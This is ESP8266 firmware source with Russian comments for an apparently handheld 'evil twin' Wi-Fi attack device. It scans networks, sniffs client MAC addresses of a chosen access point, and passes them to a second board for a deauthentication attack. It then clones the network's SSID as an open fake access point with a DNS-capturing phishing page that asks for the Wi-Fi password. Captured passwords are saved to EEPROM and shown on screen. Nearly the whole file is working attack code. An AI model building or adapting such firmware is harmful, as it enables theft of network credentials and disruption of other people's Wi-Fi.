#include <Wire.h>
#include <U8g2lib.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

// Определяем соответствие пинов ESP8266 D1 Mini V2
#define D1 5  // GPIO5 (SCL)
#define D2 4  // GPIO4 (SDA)
#define D5 14 // GPIO14 (Кнопка UP)
#define D6 12 // GPIO12 (Кнопка SELECT)
#define D7 13 // GPIO13 (Кнопка DOWN)

// Определяем кнопки
#define BTN_UP    D5
#define BTN_SELECT D6
#define BTN_DOWN  D7

#define DNS_PORT 53
DNSServer dnsServer;
ESP8266WebServer server(80);

// Инициализация дисплея (I2C)
U8G2_SH1106_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, /* SCL */ D1, /* SDA */ D2, /* reset */ U8X8_PIN_NONE);

int channel;

// Антидребезг
const int debounceDelay = 200;  // Задержка для корректного распознавания нажатий
unsigned long lastDebounceTime = 0;

// Переменные для Wi-Fi сканирования
int networkCount = 0;

// Структура для хранения информации о Wi-Fi сетях
struct WiFiNetwork {
    String ssid;
    int rssi;
    uint8_t bssid[6];  // MAC-адрес точки доступа
    int channel;       // Канал точки доступа
};

// Структура заголовка Wi-Fi кадра
struct wifi_ieee80211_mac_hdr_t {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t addr1[6];  // MAC-адрес назначения (получатель)
    uint8_t addr2[6];  // MAC-адрес отправителя (клиент)
    uint8_t addr3[6];  // BSSID (MAC-адрес точки доступа)
};

// Структура Wi-Fi пакета
struct wifi_ieee80211_packet_t {
    struct wifi_ieee80211_mac_hdr_t hdr;
};


WiFiNetwork wifiNetworks[20];  // Максимум 20 сетей
int displayStartIndex = 0;  // Индекс первой отображаемой сети

int networkMenuIndex = 0; // Текущий индекс выбора сети
WiFiNetwork selectedNetwork; // Выбранная сеть
bool networkSelected = false; // Флаг выбора сети

int selectedNetworkIndex = 0; // Индекс выбранной сети

std::vector<String> knownClients;  // Храним MAC-адреса клиентов
bool isScanningClients = false;
uint8_t targetBSSID[6];  // MAC-адрес точки доступа (BSSID)
int clientCount = 0;


String readPasswordFromEEPROM() {
    String password;
    for (int i = 0; i < 64; i++) {  // Предполагаем, что пароль не длиннее 64 символов
        char c = EEPROM.read(i);
        if (c == 0) break;  // Конец строки
        password += c;
    }
    return password;
}

void savePasswordToEEPROM(String password) {
    for (int i = 0; i < password.length(); i++) {
        EEPROM.write(i, password[i]);  // Записываем каждый символ пароля
    }
    EEPROM.write(password.length(), 0);  // Записываем нулевой символ в конце
    EEPROM.commit();  // Сохраняем изменения в EEPROM
}

// Функция для преобразования MAC-адреса в строку
String macToString(uint8_t* mac) {
    String macStr = "";
    for (int i = 0; i < 6; i++) {
        macStr += String(mac[i], HEX);
        if (i < 5) macStr += ":";
    }
    return macStr;
}

void handleRoot() {
    server.send(200, "text/html",
        "<!DOCTYPE html>"
        "<html lang='en'>"
        "<head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
        "<title>Wi-Fi Login</title>"
        "<style>"
        "body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }"
        "input { padding: 10px; font-size: 16px; margin-bottom: 10px; }"
        "button { padding: 10px 20px; font-size: 16px; background-color: #008CBA; color: white; border: none; cursor: pointer; }"
        "</style>"
        "</head>"
        "<body>"
        "<h2>Enter Wi-Fi Password</h2>"
        "<form action='/submit' method='POST'>"
        "<input type='password' name='wifi_password' placeholder='Enter Wi-Fi Password' required>"
        "<br><br>"
        "<button type='submit'>Submit</button>"
        "</form>"
        "</body>"
        "</html>");
}

void handleSubmit() {
    if (server.hasArg("wifi_password")) {
        String password = server.arg("wifi_password");
        Serial.println("Received Wi-Fi password: " + password);

        String command = password;

        displayPassword(command);

        // Сохраняем пароль в EEPROM
        savePasswordToEEPROM(password);

    }
    server.send(200, "text/html", "<h2>Password received!</h2><p>You can close this page.</p>");

    delay(3000);

    WiFi.softAPdisconnect(true);
}

void startFakeAP(const char *ssid, int channel) {
    Serial.println("==> Starting Fake AP...");
    
    WiFi.persistent(false);  // Отключаем сохранение настроек Wi-Fi в EEPROM
    WiFi.disconnect(true);   // Полностью сбрасываем Wi-Fi
    delay(100);
    
    WiFi.mode(WIFI_AP);
    WiFi.softAPdisconnect(true); // Полностью отключаем AP перед стартом
    delay(100);

    WiFi.softAP(ssid, NULL);
    //WiFi.softAP("test123", NULL);
    wifi_set_channel(channel);

    Serial.println("Fake AP started!");
    Serial.print("SSID: ");
    Serial.println(ssid);
    Serial.print("Channel: ");
    Serial.println(channel);

    // Запускаем DNS-захват
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

    // Captive Portal Redirect
    server.on("/hotspot-detect.html", handleRoot);
    server.on("/submit", HTTP_POST, handleSubmit);
    server.begin();
    Serial.println("Captive Portal started.");

    // Вывод на дисплей
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(10, 10);
    u8g2.print("Fake AP started");
    u8g2.sendBuffer();

    delay(2000);

    //animateWaitingForPassword();

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(10, 20);
    u8g2.println("Wait password:");
    u8g2.sendBuffer();
}

void sendDeauthDataToSlave() {
    String data = "BSSID:" + macToString(targetBSSID) + ",Channel:" + String(wifiNetworks[selectedNetworkIndex].channel) + ",Clients:";

    // Формируем список клиентов
    for (int i = 0; i < knownClients.size(); i++) {
        data += knownClients[i];
        if (i < knownClients.size() - 1) {
            data += ";";  // Разделитель между клиентами
        }
    }

    // Отправляем данные на slave через UART
    Serial.println("Sending deauth data to Slave: " + data);
    Serial1.println(data);  // Отправляем данные через UART (Serial1)

    // Обновляем дисплей с количеством клиентов
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(30, 10);
    u8g2.print("Send data to");
    u8g2.setCursor(36, 20);
    u8g2.print("slave node");
    u8g2.sendBuffer();
    delay(1500);
}

void animateWaitingForPassword() {
    unsigned long startTime = millis(); // Засекаем время начала
    int i = 0;

    while (millis() - startTime < 500000) { // Анимация 5 секунд
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(10, 20);
        u8g2.print("Wait password");

        // Добавляем точки (0, 1, 2, 3 точки циклично)
        for (int j = 0; j < (i % 4); j++) {
            u8g2.print(".");
        }

        u8g2.sendBuffer();
        delay(300); // Задержка для анимации

        i++;
    }
}


void displayPassword(String password) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(10, 20);
    u8g2.println("Wi-Fi Password:");
    u8g2.setCursor(10, 40);
    u8g2.println(password);
    u8g2.sendBuffer();

    delay(5000); // Отображаем пароль 5 секунд
}

// Анимация "Scanning clients..."
void animateScanningClients() {
    for (int i = 0; i < 6; i++) { // 6 циклов (примерно 2 сек)
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(10, 20);
        u8g2.print("Scanning clients");

        // Добавляем точки в зависимости от текущего состояния анимации
        for (int j = 0; j < (i % 3) + 1; j++) {
            u8g2.print(".");
        }

        u8g2.sendBuffer();
        delay(300);  // Задержка между кадрами анимации
    }
}

// Функция для преобразования MAC-адреса из строки в массив байтов
bool stringToMac(const String& macStr, uint8_t* macArray) {
  if (macStr.length() != 17) return false;  // MAC должен быть 17 символов XX:XX:XX:XX:XX:XX

  for (int i = 0; i < 6; i++) {
    macArray[i] = (uint8_t) strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
  return true;
}

// Сканирование клиентов в сети
void scanClientsInNetwork(uint8_t *bssid, int channel) {
    Serial.println("Starting client scan...");

    Serial.print("Scanning on channel: ");
    Serial.println(channel);
    Serial.print("Target BSSID: ");
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", bssid[i]);
        if (i < 5) Serial.print(":");
    }
    Serial.println();

    //WiFi.disconnect();
    WiFi.mode(WIFI_STA);
    wifi_set_channel(channel);
    wifi_promiscuous_enable(false);
    memcpy(targetBSSID, bssid, 6);

    knownClients.clear();
    clientCount = 0;
    isScanningClients = true;

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(10, 20);
    
    for (int i = 0; i < 6; i++) { // 6 циклов для плавной анимации (2 сек)
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(10, 30);
        u8g2.print("Scanning clients");
        
        // Добавляем точки в зависимости от текущего состояния анимации
        for (int j = 0; j < (i % 3) + 1; j++) {
            u8g2.print(".");
        }
        
        u8g2.sendBuffer();
        delay(300);  // Задержка между кадрами анимации
    }

    u8g2.sendBuffer();

    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
        if (!isScanningClients) return;
        if (len < sizeof(wifi_ieee80211_mac_hdr_t)) return;

        auto *packet = (wifi_ieee80211_packet_t*)(buf + 12);
        auto *hdr = &packet->hdr;

        if (memcmp(hdr->addr3, targetBSSID, 6) == 0) {
            if (memcmp(hdr->addr2, targetBSSID, 6) != 0) {
                char clientMac[18];
                snprintf(clientMac, sizeof(clientMac), "%02X:%02X:%02X:%02X:%02X:%02X",
                         hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                         hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);

                if (std::find(knownClients.begin(), knownClients.end(), clientMac) == knownClients.end()) {
                    knownClients.push_back(String(clientMac));
                    Serial.print("Client MAC found: ");
                    Serial.println(clientMac);
                    clientCount++;

                    // Обновляем дисплей с количеством клиентов
                    u8g2.clearBuffer();
                    u8g2.setFont(u8g2_font_6x10_tr);
                    u8g2.setCursor(10, 10);
                    u8g2.print("Clients: ");
                    u8g2.print(clientCount);
                    u8g2.sendBuffer();
                }
            }
        }
    });

    wifi_promiscuous_enable(true);
    Serial.println("Scanning clients for 10 seconds...");
    delay(10000);
    wifi_promiscuous_enable(false);
    isScanningClients = false;

    Serial.printf("Client scan completed. Total clients found: %d\n", clientCount);

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(10, 10);

    if (clientCount == 0) {
        u8g2.print("No clients found.");
        Serial.println("No clients found.");

        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(10, 10);
        u8g2.print("No clients found.");
        u8g2.sendBuffer();
        delay(2000);

        selectNetworkMenu();
    } else {
        u8g2.print("Clients: ");
        u8g2.print(clientCount);
        Serial.printf("Clients found: %d\n", clientCount);
    }

    // Если есть клиенты, выполнить атаку по очереди
    if (clientCount > 0) {
      sendDeauthDataToSlave();
    uint8_t clientMAC[6];
    int numClients = knownClients.size();
    for (int i = 0; i < 100; i++) { // 100 - бывший deauth count
        int clientIndex = i % numClients;
        if (stringToMac(knownClients[clientIndex], clientMAC)) {
        } else {
            Serial.printf("Invalid MAC format for client: %s, skipping...\n", knownClients[clientIndex].c_str());
        }
        delay(100);
        }
        Serial.println("Round-robin Deauth attack completed.");
        } else {
            Serial.println("No clients found. Attack skipped.");
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.setCursor(10, 10);
            u8g2.print("No clients found.");
            delay(2000);
            u8g2.sendBuffer();
        }
}

void selectNetworkMenu() {
    Serial.println("Selecting network...");
    selectedNetworkIndex = 0;
    displayStartIndex = 0;

    while (true) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(10, 10);
        u8g2.print("Networks: ");
        u8g2.print(networkCount);

        // Отображаем список сетей (ТОЛЬКО 3 одновременно)
        for (int i = 0; i < 3 && (displayStartIndex + i) < networkCount; i++) {
            int netIndex = displayStartIndex + i;

            // Если это выбранная сеть - рисуем стрелочку ">"
            if (netIndex == selectedNetworkIndex) {
                u8g2.setCursor(5, 25 + (i * 12)); // Стрелка слева
                u8g2.print("> ");
                u8g2.setCursor(15, 25 + (i * 12));
            } else {
                u8g2.setCursor(15, 25 + (i * 12));
            }

            u8g2.print(wifiNetworks[netIndex].ssid);
        }

        u8g2.sendBuffer();
        yield();  // Предотвращает WDT Reset

        // Кнопка ВВЕРХ
        if (buttonPressed(BTN_UP)) {
            if (selectedNetworkIndex > 0) {
                selectedNetworkIndex--;
                if (selectedNetworkIndex < displayStartIndex) {
                    displayStartIndex--;
                }
            }
            Serial.printf("Moved up to: %s\n", wifiNetworks[selectedNetworkIndex].ssid.c_str());
            delay(200);  // Антидребезг
        }

        // Кнопка ВНИЗ
        if (buttonPressed(BTN_DOWN)) {
            if (selectedNetworkIndex < networkCount - 1) {
                selectedNetworkIndex++;
                if (selectedNetworkIndex >= displayStartIndex + 3) {
                    displayStartIndex++;
                }
            }
            Serial.printf("Moved down to: %s\n", wifiNetworks[selectedNetworkIndex].ssid.c_str());
            delay(200);  // Антидребезг
        }

        // Кнопка ВЫБОР
        if (buttonPressed(BTN_SELECT)) {
            Serial.println("Network selected:");
            Serial.println(wifiNetworks[selectedNetworkIndex].ssid);

            // Получаем BSSID и канал выбранной сети
            String selectedSSID = wifiNetworks[selectedNetworkIndex].ssid;
            int selectedChannel = wifiNetworks[selectedNetworkIndex].channel;
            
            delay(1000);

            // Переход к сканированию клиентов
            scanClientsInNetwork(wifiNetworks[selectedNetworkIndex].bssid, wifiNetworks[selectedNetworkIndex].channel);
            delay(1000);
            startFakeAP(wifiNetworks[selectedNetworkIndex].ssid.c_str(), selectedChannel);
            break;
        }
        delay(10);  // Предотвращает WDT Reset
    }
}

// Функция сканирования Wi-Fi сетей
void scanWiFiNetworks() {
    Serial.println("Запуск сканирования Wi-Fi сетей...");
    
    WiFi.mode(WIFI_STA);

    // Анимация сканирования
    for (int i = 0; i < 6; i++) { // 6 циклов для плавной анимации (2 сек)
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(20, 30);
        u8g2.print("Scanning Wi-Fi");
        
        // Добавляем точки в зависимости от текущего состояния анимации
        for (int j = 0; j < (i % 3) + 1; j++) {
            u8g2.print(".");
        }
        
        u8g2.sendBuffer();
        delay(300);  // Задержка между кадрами анимации
    }

    // Сканирование сетей
    networkCount = WiFi.scanNetworks();
    Serial.printf("Найдено сетей: %d\n", networkCount);

    if (networkCount == 0) {
        Serial.println("Нет доступных сетей.");
        u8g2.clearBuffer();
        u8g2.setCursor(10, 30);
        u8g2.print("No Networks Found");
        u8g2.sendBuffer();
        delay(2000);
        return;
    }

    // Заполнение массива wifiNetworks
    for (int i = 0; i < std::min(networkCount, 20); i++) {
        wifiNetworks[i].ssid = WiFi.SSID(i);
        wifiNetworks[i].rssi = WiFi.RSSI(i);
        memcpy(wifiNetworks[i].bssid, WiFi.BSSID(i), 6);  // Копируем MAC-адрес
        wifiNetworks[i].channel = WiFi.channel(i);        // Получаем канал

        // Вывод в Serial Monitor для отладки
        Serial.printf("%d. SSID: %s, Signal: %d dBm, MAC: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d\n", 
                      i + 1, wifiNetworks[i].ssid.c_str(), wifiNetworks[i].rssi,
                      wifiNetworks[i].bssid[0], wifiNetworks[i].bssid[1], wifiNetworks[i].bssid[2],
                      wifiNetworks[i].bssid[3], wifiNetworks[i].bssid[4], wifiNetworks[i].bssid[5],
                      wifiNetworks[i].channel);
    }

    // Сортировка сетей по RSSI (по убыванию)
    for (int i = 0; i < networkCount - 1; i++) {
        for (int j = 0; j < networkCount - i - 1; j++) {
            if (wifiNetworks[j].rssi < wifiNetworks[j + 1].rssi) {
                // Меняем местами
                WiFiNetwork temp = wifiNetworks[j];
                wifiNetworks[j] = wifiNetworks[j + 1];
                wifiNetworks[j + 1] = temp;
            }
        }
    }

    // Вывод отсортированных сетей в Serial Monitor
    Serial.println("Сети после сортировки:");
    for (int i = 0; i < networkCount; i++) {
        Serial.printf("%d. SSID: %s, Signal: %d dBm, MAC: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d\n",
                      i + 1, wifiNetworks[i].ssid.c_str(), wifiNetworks[i].rssi,
                      wifiNetworks[i].bssid[0], wifiNetworks[i].bssid[1], wifiNetworks[i].bssid[2],
                      wifiNetworks[i].bssid[3], wifiNetworks[i].bssid[4], wifiNetworks[i].bssid[5],
                      wifiNetworks[i].channel);
    }

    Serial.println("Сканирование завершено.");

    // Переход к выбору сети
    selectNetworkMenu();
}

void drawWiFiNetworks() {
    Serial.println("Отображение Wi-Fi сетей...");

    // Очистка дисплея и отображение всех сетей
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(10, 10);
    u8g2.println("Wi-Fi Networks:");

    // Отображение всех сетей с наилучшим сигналом
    for (int i = 0; i < networkCount; i++) {
        int y = 20 + i * 12;  // Позиция текста на дисплее
        if (y > u8g2.getDisplayHeight()) break;  // Прекращаем, если текст выходит за пределы экрана

        u8g2.setCursor(10, y);
        u8g2.printf("%d. %s (%d dBm)", i + 1, wifiNetworks[i].ssid.c_str(), wifiNetworks[i].rssi);
    }

    u8g2.sendBuffer();
    Serial.println("Вывод на дисплей выполнен.");
}

// Лого
void Logo() {
  Serial.println("Отображение логотипа...");
  u8g2.clearBuffer();
  
  // Устанавливаем меньший шрифт
  u8g2.setFont(u8g2_font_fub17_tr);
  
  // Выравниваем текст по центру
  int textWidth = u8g2.getStrWidth("unit3301");  // Ширина текста
  int x = (u8g2.getDisplayWidth() - textWidth) / 2;  // Центрирование по горизонтали
  int y = u8g2.getDisplayHeight() / 2 + 8;  // Центрирование по вертикали
  
  u8g2.setCursor(x, y);
  u8g2.print("unit3301");
  u8g2.sendBuffer();
  
  delay(1250);
  Serial.println("Логотип показан.");
}

bool buttonPressed(int buttonPin) {
    if (digitalRead(buttonPin) == LOW) {  // Кнопка нажата
        delay(10);  // Антидребезг
        if (digitalRead(buttonPin) == LOW) {  // Проверяем, все еще нажата?
            while (digitalRead(buttonPin) == LOW) {
                delay(10);  // Ждем, пока кнопку отпустят
            }
            return true;  // Кнопка была нажата и отпущена
        }
    }
    return false;  // Кнопка не нажата
}

void setup() {
  Serial.begin(115200);
  Serial1.begin(115200);
  EEPROM.begin(512);
  u8g2.begin();
  Serial.println("Запуск...");

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);

  Logo();

  // Проверяем сохраненный пароль
    String savedPassword = readPasswordFromEEPROM();
    if (savedPassword.length() > 0) {
        Serial.println("Saved password: " + savedPassword);
        displayPassword(savedPassword);
        delay(3000);
    } else {
        Serial.println("No password saved.");
        displayPassword("No password saved.");
        delay(1500);
    }

  scanWiFiNetworks();
  //drawWiFiNetworks();
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
}